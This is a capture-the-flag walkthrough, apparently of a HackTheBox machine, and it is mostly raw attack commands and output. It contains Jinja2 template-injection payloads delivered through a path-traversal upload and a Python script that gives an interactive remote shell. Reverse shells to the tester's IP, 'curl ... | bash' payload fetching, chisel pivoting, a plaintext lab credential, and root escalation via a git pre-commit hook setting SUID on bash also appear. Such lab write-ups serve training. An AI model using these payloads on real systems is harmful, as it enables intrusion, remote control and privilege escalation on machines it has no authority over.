## Web Dir Scan
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.129.67.128/FUZZ
```

```
console                 [Status: 200, Size: 1563, Words: 330, Lines: 46, Duration: 614ms]
download                [Status: 200, Size: 2489147, Words: 9473, Lines: 9803, Duration: 553ms]
```

## RFI in Upload
![](Pasted%20image%2020220523181125.png)
```
/./././././././././././app/app/templates/index.php
```

### Index.html Template Injection
```
------WebKitFormBoundary51LPcJy60F7ZBOSm
Content-Disposition: form-data; name="file"; filename="/./././././././././././app/app/templates/index.html"
Content-Type: text/html

{{request.application.__globals__.__builtins__.__import__("os").popen("pwd").read()}}

------WebKitFormBoundary51LPcJy60F7ZBOSm--
```

```python
# import 
from pwn import *
import sys, requests
import html



while True:
    inputs = input("/bin/sh: ")
    payload = '''POST /upcloud HTTP/1.1
Host: 10.129.70.105
Content-Length: 416
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.70.105
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryC9Ah8AKK48kfpLY7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.70.105/upcloud
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

------WebKitFormBoundaryC9Ah8AKK48kfpLY7
Content-Disposition: form-data; name="file"; filename="/./././././././././././app/app/templates/index.html"
Content-Type: text/html

{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen("'''+ inputs +''' 2> error").read() }}
{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('cat error').read() }}

------WebKitFormBoundaryC9Ah8AKK48kfpLY7--











'''
    # set debug to only error
    context.log_level = 'critical'
    # set to tcp
    
    ip = '10.129.70.105'
    with remote(ip, 80) as s:
        s.send_raw(bytes(payload, 'utf-8'))
        s.recv(1000000).decode('utf-8')
        s.close()
    with requests.get(f'http://{ip}') as con:
        # decode from html code to string
        con = html.unescape(con.text)
        print(con)

```

```sh
bash -i >& /dev/tcp/10.10.15.102/4444 0>&1
```

```sh
sudo python3 -m http.server 443
```

```
nc -nvlp 1234
```
my ip 10.10.15.102
```
{{request.application.__globals__.__builtins__.__import__('os').popen(\''''+ input +'''\').read()}}
```

```sh
echo '#!/bin/sh
sh -c "sh -i >& /dev/tcp/10.10.15.102/4000 0>&1"' > revshell
```

```
{{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.10.15.102/revshell | bash').read()}}
```

### info
```
arch
ash
base64
bbconfig
busybox
cat
chgrp
chmod
chown
cp
date
dd
df
dmesg
dnsdomainname
dumpkmap
echo
ed
egrep
false
fatattr
fdflush
fgrep
fsync
getopt
grep
gunzip
gzip
hostname
ionice
iostat
ipcalc
kbd_mode
kill
link
linux32
linux64
ln
login
ls
lzop
makemime
mkdir
mknod
mktemp
more
mount
mountpoint
mpstat
mv
netstat
nice
pidof
ping
ping6
pipe_progress
printenv
ps
pwd
reformime
rev
rm
rmdir
run-parts
sed
setpriv
setserial
sh
sleep
stat
stty
su
sync
tar
touch
true
umount
uname
usleep
watch
zcat
```
### 
```

{{request.application.__globals__.__builtins__.__import__("os").listdir('/root')}}
{{request.application.__globals__.__builtins__.open('/').read()}}
```

```
ash -i >& /dev/tcp/10.10.15.102/4444 0>&1
```
### 
```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```
### 
in /tmp
![](cert.txt) 
```python
# import something that can regex
from os import mkdir, popen
import re
with open('cert.txt', 'r') as f:
    f = f.read()

# print all cert
f = re.findall(r'-----BEGIN CERTIFICATE-----\n(.*?)\n-----END CERTIFICATE-----', f, re.DOTALL)
try:
    mkdir('pemlist')
except:
    pass
for i in range(len(f)):
    # make a file to save cert
    with open(f'pemlist/cert{i}.priv', 'w+') as pem:
        pem.write(f'-----BEGIN CERTIFICATE-----\n{f[i]}\n-----END CERTIFICATE-----')
popen('chmod 600 ./pemlist/*')
```

```sh
touch ../extracted.txt
for i in `ls`
do
    echo $i
    openssl x509 -in $i -text >> ../extracted.txt
done
```
### 
```
/run:
supervisord.pid
```
### 
```
/sbin:
acpid
adjtimex
apk
arp
blkid
blockdev
depmod
fbsplash
fdisk
findfs
fsck
fstrim
getty
halt
hwclock
ifconfig
ifdown
ifenslave
ifup
init
inotifyd
insmod
ip
ipaddr
iplink
ipneigh
iproute
iprule
iptunnel
klogd
ldconfig
loadkmap
logread
losetup
lsmod
mdev
mkdosfs
mkfs.vfat
mkmntdirs
mkswap
modinfo
modprobe
nameif
nologin
pivot_root
poweroff
raidautorun
reboot
rmmod
route
setconsole
slattach
swapoff
swapon
switch_root
sysctl
syslogd
tunctl
udhcpc
vconfig
watchdog
```

```
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:08  
          inet addr:172.17.0.8  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:4767 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3996 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:552796 (539.8 KiB)  TX bytes:3809263 (3.6 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:6 errors:0 dropped:0 overruns:0 frame:0
          TX packets:6 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:504 (504.0 B)  TX bytes:504 (504.0 B)

```

```
wget 10.10.15.102/linpeas.sh
```

```
uid_map
```

```
Content-Disposition: form-data; name="file"; filename="/./././././././././././app/app/templates/index.html"
Content-Type: text/html

{{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.103 4444 >/tmp/f 2> error').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id 2>> error').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat error').read()}}
```

### Is VM?
```
python -c 'import pty;pty.spawn("/bin/sh")'
```

```
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:09     
         inet addr:172.17.0.9  Bcast:172.17.255.255  Mask:255.255.0.0  
         UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1  
         RX packets:1428 errors:0 dropped:0 overruns:0 frame:0  
         TX packets:1184 errors:0 dropped:0 overruns:0 carrier:0  
         collisions:0 txqueuelen:0    
         RX bytes:137053 (133.8 KiB)  TX bytes:1403944 (1.3 MiB)  
  
lo        Link encap:Local Loopback     
         inet addr:127.0.0.1  Mask:255.0.0.0  
         UP LOOPBACK RUNNING  MTU:65536  Metric:1  
         RX packets:0 errors:0 dropped:0 overruns:0 frame:0  
         TX packets:0 errors:0 dropped:0 overruns:0 carrier:0  
         collisions:0 txqueuelen:1000    
         RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

## use proxy
https://github.com/jpillora/chisel/releases
```
python3 -m http.server 1234
```
local
```
./chisel -v server --reverse --port 10000
```
target
```
./chisel client -v 10.10.15.103:10000 R:socks
```

```
sudo proxychains nmap -sT -Pn -n  172.17.0.1 -vvv
```

```
Nmap scan report for 172.17.0.1
Host is up, received user-set (1.2s latency).
Scanned at 2022-05-25 09:16:27 +08 for 1195s
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack
6000/tcp open  X11     syn-ack
6001/tcp open  X11:1   syn-ack
6002/tcp open  X11:2   syn-ack
6003/tcp open  X11:3   syn-ack
6004/tcp open  X11:4   syn-ack
6005/tcp open  X11:5   syn-ack
6006/tcp open  X11:6   syn-ack
6007/tcp open  X11:7   syn-ack
```

```
dev01:Soulless_Developer#2022
```
login 172.17.0.1:3000 menggunakan dev01
![](dev0.pub)
```
ssh -i dev0.pub dev01@10.129.73.86
```

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
```

```
2022/05/25 02:55:01 CMD: UID=0    PID=29131  | /bin/bash /usr/local/bin/git-sync 
2022/05/25 02:55:01 CMD: UID=0    PID=29130  | /bin/sh -c /usr/local/bin/git-sync 
2022/05/25 02:55:01 CMD: UID=0    PID=29129  | /usr/sbin/CRON -f 
2022/05/25 02:55:01 CMD: UID=0    PID=29137  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2022/05/25 02:55:01 CMD: UID=0    PID=29136  | git push origin main 

```

```
We see a git commit without any specific arguements. We can abuse the “pre-commit” script to get a reverse shell or convert bash into an SUID. Within ~/.git/hooks/pre-commit.sample, we add the following line to the top (under #!/bin/bash)
```

```
cat ~/.git/hooks/pre-commit.sample
vim ~/.git/hooks/pre-commit.sample
```

```
chmod u+s /bin/bash
```

```
cp ~/.git/hooks/pre-commit.sample ~/.git/hooks/pre-commit
ls -l /bin/bash
bash -p
```

## Referensi
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e
https://stackoverflow.com/questions/43384627/how-to-get-rsa-key-from-begin-certificate-from-crt-and-pem-file#:~:text=This%20is%20a%20certificate%20in,never%20contain%20a%20private%20key.
https://lactea.kr/entry/python-flask-debugger-pin-find-and-exploit
https://breached.co/Thread-HTB-Easy-OpenSource-Writeup